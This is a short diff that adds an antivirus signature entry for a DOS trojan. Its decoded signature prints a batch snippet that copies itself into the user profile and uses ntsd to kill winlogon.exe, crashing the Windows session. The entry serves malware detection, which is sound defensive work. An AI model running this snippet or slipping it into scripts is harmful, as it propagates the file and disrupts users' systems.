@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36691
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off set var=%userprofile%\\\ xcopy/y %0 "%var%"\ cmd /c start /min ntsd -c q -pn winlogon.exe 1>nul 2>nul
